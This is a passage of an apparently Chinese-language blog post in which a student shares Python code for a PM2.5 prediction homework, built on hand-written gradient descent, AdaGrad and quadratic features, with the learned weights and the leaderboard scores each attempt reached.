class="string">'train.csv'</span>, <span class="string">'r'</span>, <span class="keyword">True</span>, <span class="string">'big5hkscs'</span>);</span><br><span class="line">data_init = ff.readlines()</span><br><span class="line">total_line = len(data_init)<span class="number">-1</span></span><br><span class="line"><span class="comment"># total_line = 19</span></span><br><span class="line">total_type = <span class="number">18</span></span><br><span class="line"></span><br><span class="line">data = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(total_type)]</span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, total_line+<span class="number">1</span>): </span><br><span class="line">    <span class="comment"># print(i, data_init[i], end=' ')</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> data_init[i].split(<span class="string">','</span>)[<span class="number">3</span>:]: </span><br><span class="line">        <span class="comment"># print(j, end=' ')</span></span><br><span class="line">        <span class="keyword">if</span>(j.startswith(<span class="string">"NR"</span>)):</span><br><span class="line">            data[(i<span class="number">-1</span>)%total_type].append(<span class="number">0.0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data[(i<span class="number">-1</span>)%total_type].append(float(j))</span><br><span class="line">    <span class="comment"># print()</span></span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in data:</span></span><br><span class="line"><span class="comment">#     print(len(i))</span></span><br><span class="line"></span><br><span class="line">ff.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># init model without adagrad</span></span><br><span class="line"><span class="comment"># just consider one type</span></span><br><span class="line">learningrate = <span class="number">1e-9</span></span><br><span class="line"><span class="comment"># w = [0 for i in range(9)]</span></span><br><span class="line"><span class="comment"># b = 0</span></span><br><span class="line"></span><br><span class="line">w = [<span class="number">0.025824524413455778</span>, <span class="number">0.013532431831135698</span>, <span class="number">0.006330265404890848</span>, <span class="number">0.007117255928494381</span>, <span class="number">0.01912520613272634</span>, <span class="number">0.031712687701763935</span>, <span class="number">-0.1291674302877186</span>, <span class="number">0.21741455874560975</span>, <span class="number">0.7772617955877607</span>]</span><br><span class="line">b = <span class="number">0.02353711727271333</span></span><br><span class="line"></span><br><span class="line">par = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>)]</span><br><span class="line"></span><br><span class="line">print(data[<span class="number">9</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(a)</span>:</span> <span class="comment"># calc y</span></span><br><span class="line">    y = b</span><br><span class="line">    <span class="comment"># print(len(a))</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(a)):</span><br><span class="line">        y += w[i]*a[i]</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LF</span><span class="params">()</span>:</span> <span class="comment"># loss function</span></span><br><span class="line">    tot1, tot2 = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>, len(data[<span class="number">9</span>])<span class="number">-1</span>):</span><br><span class="line">        tot1 += data[<span class="number">9</span>][i]-f(data[<span class="number">9</span>][i<span class="number">-9</span>: i])</span><br><span class="line">        tot2 += (data[<span class="number">9</span>][i]-f(data[<span class="number">9</span>][i<span class="number">-9</span>: i]))**<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> tot1, tot2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpart</span><span class="params">()</span>:</span> <span class="comment"># get partial w_i,b</span></span><br><span class="line">    <span class="keyword">global</span> w,b,learningrate</span><br><span class="line">    parw = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>)]</span><br><span class="line">    parb = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>, len(data[<span class="number">9</span>])<span class="number">-1</span>):</span><br><span class="line">        a = data[<span class="number">9</span>][i<span class="number">-9</span>: i]</span><br><span class="line">        tmp = data[<span class="number">9</span>][i]-f(a)</span><br><span class="line">        <span class="comment"># print('a = ', a, ' tmp = ', tmp, 'f(a) = ', f(a))</span></span><br><span class="line">        parb += <span class="number">-2</span>*(tmp)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(parw)):</span><br><span class="line">            parw[j] += <span class="number">-2</span>*tmp*a[j]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(parw, parb)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        w[i]=w[i]-learningrate*parw[i]</span><br><span class="line">    b = b-learningrate*parb</span><br><span class="line"></span><br><span class="line"><span class="comment"># main loop</span></span><br><span class="line">times = <span class="number">1000</span></span><br><span class="line">learningrate = <span class="number">1e-9</span></span><br><span class="line">loss2 = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    lst = loss2</span><br><span class="line">    loss1, loss2 = LF()</span><br><span class="line">    print(loss2)</span><br><span class="line">    getpart()</span><br><span class="line">    <span class="keyword">if</span> abs(lst-loss2) &lt; <span class="number">0.1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print(w, b, learningrate, end=' -&gt; ')</span></span><br><span class="line"></span><br><span class="line">learningrate = <span class="number">1e-10</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    lst = loss2</span><br><span class="line">    loss1, loss2 = LF()</span><br><span class="line">    print(loss2)</span><br><span class="line">    getpart()</span><br><span class="line">    <span class="keyword">if</span> abs(lst-loss2) &lt; <span class="number">0.1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">learningrate = <span class="number">1e-11</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    lst = loss2</span><br><span class="line">    loss1, loss2 = LF()</span><br><span class="line">    print(loss2)</span><br><span class="line">    getpart()</span><br><span class="line">    <span class="keyword">if</span> abs(lst-loss2) &lt; <span class="number">0.1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(w, b)</span><br><span class="line">print(<span class="string">'----------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read test data &amp; output result</span></span><br><span class="line">ff = open(<span class="string">'test.csv'</span>, <span class="string">'r'</span>, <span class="keyword">True</span>, <span class="string">'big5hkscs'</span>)</span><br><span class="line">fo = open(<span class="string">'ans.csv'</span>, <span class="string">'w'</span>, <span class="keyword">True</span>, <span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">dd = ff.readlines()</span><br><span class="line"></span><br><span class="line">print(<span class="string">'id,value'</span>, file=fo)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dd:</span><br><span class="line">    line = i.split(<span class="string">','</span>)</span><br><span class="line">    <span class="comment"># print(line)</span></span><br><span class="line">    <span class="keyword">if</span>(line[<span class="number">1</span>].startswith(<span class="string">"PM2.5"</span>)):</span><br><span class="line">        a = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> line[<span class="number">2</span>:]:</span><br><span class="line">            a.append(float(j))</span><br><span class="line">        print(line[<span class="number">0</span>], <span class="string">','</span>, f(a), file=fo, sep=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>总共跑了大概30min，然后得到了一个结果<code>226303.2859914291</code>，得到的w和b在下面，得到的分数是<code>private:7.29680 public:6.02679</code>，也差不多是我这种乱搞做法的比较好的结果了吧<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">w = [<span class="number">-0.01196089473848148</span>, <span class="number">-0.0002154942523566853</span>, <span class="number">0.15614885717614674</span>, <span class="number">-0.18703390611436793</span>, <span class="number">-0.028484991059330843</span>, <span class="number">0.46031602604586386</span>, <span class="number">-0.5230520726349329</span>, <span class="number">0.013331313987351568</span>, <span class="number">1.091108574289711</span>]</span><br><span class="line">b = <span class="number">0.15907341031251657</span></span><br></pre></td></tr></table></figure></p><p>我发现那个助教做Demo的时候也是计次…<br>AdaGrad 有进步但是不太大<code>private:7.24162 public:5.93032</code><br>我发现Learning Rate的初始值还是很重要的，不然第一次偏差太大，后面跑回来就比较慢了</p><p>我又在这基础上Train了一下，<code>private:7.24797 public:5.92997</code>，分数反而下降了…<br>不解挠头，我好像不知道怎么变得更好了…<br>我觉得吧…可能是多加些参数了，把其他的条件考虑进去再加上二次项</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># read data</span></span><br><span class="line"></span><br><span class="line">ff = open(<span class="string">'train.csv'</span>, <span class="string">'r'</span>, <span class="keyword">True</span>, <span class="string">'big5hkscs'</span>);</span><br><span class="line">data_init = ff.readlines()</span><br><span class="line">total_line = len(data_init)<span class="number">-1</span></span><br><span class="line"><span class="comment"># total_line = 19</span></span><br><span class="line">total_type = <span class="number">18</span></span><br><span class="line"></span><br><span class="line">data = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(total_type)]</span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, total_line+<span class="number">1</span>): </span><br><span class="line">    <span class="comment"># print(i, data_init[i], end=' ')</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> data_init[i].split(<span class="string">','</span>)[<span class="number">3</span>:]: </span><br><span class="line">        <span class="comment"># print(j, end=' ')</span></span><br><span class="line">        <span class="keyword">if</span>(j.startswith(<span class="string">"NR"</span>)):</span><br><span class="line">            data[(i<span class="number">-1</span>)%total_type].append(<span class="number">0.0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data[(i<span class="number">-1</span>)%total_type].append(float(j))</span><br><span class="line">    <span class="comment"># print()</span></span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in data:</span></span><br><span class="line"><span class="comment">#     print(len(i))</span></span><br><span class="line"></span><br><span class="line">ff.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># init model without adagrad</span></span><br><span class="line"><span class="comment"># just consider one type</span></span><br><span class="line"></span><br><span class="line">learningrate = <span class="number">0.02</span></span><br><span class="line"><span class="comment"># w = [0 for i in range(9)]</span></span><br><span class="line"><span class="comment"># b = 0</span></span><br><span class="line"></span><br><span class="line">w = [<span class="number">-0.027453064157575136</span>, <span class="number">-0.023350934972838352</span>, <span class="number">0.20364257875107225</span>, <span class="number">-0.22111429241618002</span>, <span class="number">-0.054197655604759414</span>, <span class="number">0.511059787427728</span>, <span class="number">-0.5551156971312344</span>, <span class="number">0.0029147111942378363</span>, <span class="number">1.0896194827444017</span>]</span><br><span class="line">b = <span class="number">1.516876275197267</span></span><br><span class="line"></span><br><span class="line">par = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>)]</span><br><span class="line"></span><br><span class="line">g = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>)]</span><br><span class="line">gb = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">print(data[<span class="number">9</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(a)</span>:</span> <span class="comment"># calc y</span></span><br><span class="line">    y = b</span><br><span class="line">    <span class="comment"># print(len(a))</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(a)):</span><br><span class="line">        y += w[i]*a[i]</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LF</span><span class="params">()</span>:</span> <span class="comment"># loss function</span></span><br><span class="line">    tot1, tot2 = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>, len(data[<span class="number">9</span>])<span class="number">-1</span>):</span><br><span class="line">        tot1 += data[<span class="number">9</span>][i]-f(data[<span class="number">9</span>][i<span class="number">-9</span>: i])</span><br><span class="line">        tot2 += (data[<span class="number">9</span>][i]-f(data[<span class="number">9</span>][i<span class="number">-9</span>: i]))**<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> tot1, tot2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpart</span><span class="params">()</span>:</span> <span class="comment"># get partial w_i,b</span></span><br><span class="line">    <span class="keyword">global</span> w, b, learningrate, g, gb</span><br><span class="line">    parw = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>)]</span><br><span class="line">    parb = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>, len(data[<span class="number">9</span>])<span class="number">-1</span>):</span><br><span class="line">        a = data[<span class="number">9</span>][i<span class="number">-9</span>: i]</span><br><span class="line">        tmp = data[<span class="number">9</span>][i]-f(a)</span><br><span class="line">        <span class="comment"># print('a = ', a, ' tmp = ', tmp, 'f(a) = ', f(a))</span></span><br><span class="line">        parb += <span class="number">-2</span>*(tmp)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(parw)):</span><br><span class="line">            parw[j] += <span class="number">-2</span>*tmp*a[j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        g[i] += parw[i]**<span class="number">2</span></span><br><span class="line">    gb += parb**<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(parw, parb)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        w[i]=w[i]-learningrate/np.sqrt(g[i])*parw[i]</span><br><span class="line">    b = b-learningrate/np.sqrt(gb)*parb</span><br><span class="line"></span><br><span class="line"><span class="comment"># main loop</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">times = <span class="number">10000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(times): </span><br><span class="line">    loss1, loss2 = LF()</span><br><span class="line">    print(loss2)</span><br><span class="line">    getpart()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(w, b)</span><br><span class="line">print(<span class="string">'----------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read test data &amp; output result</span></span><br><span class="line">ff = open(<span class="string">'test.csv'</span>, <span class="string">'r'</span>, <span class="keyword">True</span>, <span class="string">'big5hkscs'</span>)</span><br><span class="line">fo = open(<span class="string">'ans.csv'</span>, <span class="string">'w'</span>, <span class="keyword">True</span>, <span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">dd = ff.readlines()</span><br><span class="line"></span><br><span class="line">print(<span class="string">'id,value'</span>, file=fo)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dd:</span><br><span class="line">    line = i.split(<span class="string">','</span>)</span><br><span class="line">    <span class="comment"># print(line)</span></span><br><span class="line">    <span class="keyword">if</span>(line[<span class="number">1</span>].startswith(<span class="string">"PM2.5"</span>)):</span><br><span class="line">        a = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> line[<span class="number">2</span>:]:</span><br><span class="line">            a.append(float(j))</span><br><span class="line">        print(line[<span class="number">0</span>], <span class="string">','</span>, f(a), file=fo, sep=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>哇哦 果然，考虑了二次项，就Training了一次，从0开始，虽然得到的loss有<code>249940.5819514999</code>，但是得到的结果就比之前好得多<code>private:7.19917 public:6.21872</code><br>惊了第二次<code>private:6.64656 public:6.05368</code>，直接过了strong baseline，进前30了…<br>第三次<code>private:6.48045 public:5.98424</code>，嗯，这个作业就先这样吧…继续看看然后搞后面的了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># train once</span></span><br><span class="line">w = [<span class="number">0.038419991693316446</span>, <span class="number">0.007631560179476181</span>, <span class="number">0.017121148559214105</span>, <span class="number">0.008416625938076962</span>, <span class="number">0.03344269223900898</span>, <span class="number">0.07485213150840617</span>, <span class="number">0.02749672696408752</span>, <span class="number">0.22824357598542835</span>, <span class="number">0.5376247829222051</span>, <span class="number">-0.0009578224442509027</span>, <span class="number">-5.528884121464584e-05</span>, <span class="number">0.0015892367969355542</span>, <span class="number">-0.002221411021284927</span>, <span class="number">-0.0005837884778601767</span>, <span class="number">0.004221860266845362</span>, <span class="number">-0.006797969291691342</span>, <span class="number">-0.00225338003274975</span>, <span class="number">0.006461549785024542</span>] </span><br><span class="line">b = <span class="number">0.7707164178028746</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># train twice</span></span><br><span class="line">w = [<span class="number">0.04550231793751899</span>, <span class="number">-0.002754055810508499</span>, <span class="number">0.01938652727209127</span>, <span class="number">-0.012606727374062035</span>, <span class="number">0.026644811794796486</span>, <span class="number">0.08529566547520964</span>, <span class="number">-0.07289173105545857</span>, <span class="number">0.20945837091642078</span>, <span class="number">0.6670259504885876</span>, <span class="number">-0.0010213018236748075</span>, <span class="number">5.8566384278349695e-05</span>, <span class="number">0.0015977330997915425</span>, <span class="number">-0.0020381249207644136</span>, <span class="number">-0.0005208828351068215</span>, <span class="number">0.00420797586899282</span>, <span class="number">-0.005646668562707524</span>, <span class="number">-0.0020696412509102606</span>, <span class="number">0.004923568539656863</span>]</span><br><span class="line">b = <span class="number">0.9254806340743505</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># train third</span></span><br><span class="line">w = [<span class="number">0.04570395973486438</span>, <span class="number">-0.011294077186582839</span>, <span class="number">0.025386967127299973</span>, <span class="number">-0.029212382678632333</span>, <span class="number">0.028545066193682748</span>, <span class="number">0.11101330569370138</span>, <span class="number">-0.14814515409168333</span>, <span class="number">0.17550209989307616</span>, <span class="number">0.7622350658920563</span>, <span class="number">-0.0010221349938858725</span>, <span class="number">0.00015306217718345381</span>, <span class="number">0.0015709039506438167</span>, <span class="number">-0.0019038640450172112</span>, <span class="number">-0.0005728314281040582</span>, <span class="number">0.00400234194537975</span>, <span class="number">-0.004792016150808898</span>, <span class="number">-0.001711617920489784</span>, <span class="number">0.0038067167936126386</span>]</span><br><span class="line">b = <span class="number">1.0625348284097278</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># read data</span></span><br><span class="line"></span><br><span class="line">ff = open(<span class="string">'train.csv'</span>, <span class="string">'r'</span>, <span class="keyword">True</span>, <span class="string">'big5hkscs'</span>);</span><br><span class="line">data_init = ff.readlines()</span><br><span class="line">total_line = len(data_init)<span class="number">-1</span></span><br><span class="line"><span class="comment"># total_line = 19</span></span><br><span class="line">total_type = <span class="number">18</span></span><br><span class="line"></span><br><span class="line">data = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(total_type)]</span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, total_line+<span class="number">1</span>): </span><br><span class="line">    <span class="comment"># print(i, data_init[i], end=' ')</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> data_init[i].split(<span class="string">','</span>)[<span class="number">3</span>:]: </span><br><span class="line">        <span class="comment"># print(j, end=' ')</span></span><br><span class="line">        <span class="keyword">if</span>(j.startswith(<span class="string">"NR"</span>)):</span><br><span class="line">            data[(i<span class="number">-1</span>)%total_type].append(<span class="number">0.0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data[(i<span class="number">-1</span>)%total_type].append(float(j))</span><br><span class="line">    <span class="comment"># print()</span></span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in data:</span></span><br><span class="line"><span class="comment">#     print(len(i))</span></span><br><span class="line"></span><br><span class="line">ff.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># init model without adagrad</span></span><br><span class="line"><span class="comment"># just consider one type</span></span><br><span class="line"></span><br><span class="line">learningrate = <span class="number">1</span></span><br><span class="line">w = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>)]</span><br><span class="line">b = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">g = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>)]</span><br><span class="line">gb = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(data[9])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(a)</span>:</span> <span class="comment"># calc y</span></span><br><span class="line">    y = b</span><br><span class="line">    <span class="comment"># print(len(a))</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(a)):</span><br><span class="line">        y += w[i]*a[i] + w[i+<span class="number">9</span>]*(a[i]**<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LF</span><span class="params">()</span>:</span> <span class="comment"># loss function</span></span><br><span class="line">    tot1, tot2 = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>, len(data[<span class="number">9</span>])<span class="number">-1</span>):</span><br><span class="line">        tot1 += data[<span class="number">9</span>][i]-f(data[<span class="number">9</span>][i<span class="number">-9</span>: i])</span><br><span class="line">        tot2 += (data[<span class="number">9</span>][i]-f(data[<span class="number">9</span>][i<span class="number">-9</span>: i]))**<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> tot1, tot2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpart</span><span class="params">()</span>:</span> <span class="comment"># get partial w_i,b</span></span><br><span class="line">    <span class="keyword">global</span> w, b, learningrate, g, gb</span><br><span class="line">    parw = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>)]</span><br><span class="line">    parb = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>, len(data[<span class="number">9</span>])<span class="number">-1</span>):</span><br><span class="line">        a = data[<span class="number">9</span>][i<span class="number">-9</span>: i]</span><br><span class="line">        tmp = data[<span class="number">9</span>][i]-f(a)</span><br><span class="line">        <span class="comment"># print('a = ', a, ' tmp = ', tmp, 'f(a) = ', f(a))</span></span><br><span class="line">        parb += <span class="number">-2</span>*(tmp)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">            parw[j] += <span class="number">-2</span>*tmp*a[j]</span><br><span class="line">            parw[j+<span class="number">9</span>] += <span class="number">-2</span>*tmp*a[j]*a[j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>):</span><br><span class="line">        g[i] += parw[i]**<span class="number">2</span></span><br><span class="line">    gb += parb**<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(parw, parb)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>):</span><br><span class="line">        w[i]=w[i]-learningrate/np.sqrt(g[i])*parw[i]</span><br><span class="line">    b = b-learningrate/np.sqrt(gb)*parb</span><br><span class="line"></span><br><span class="line"><span class="comment"># main loop</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">times = <span class="number">10000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(times): </span><br><span class="line">    loss1, loss2 = LF()</span><br><span class="line">    print(loss2)</span><br><span class="line">    getpart()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(w, b)</span><br><span class="line">print(<span class="string">'----------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read test data &amp; output result</span></span><br><span 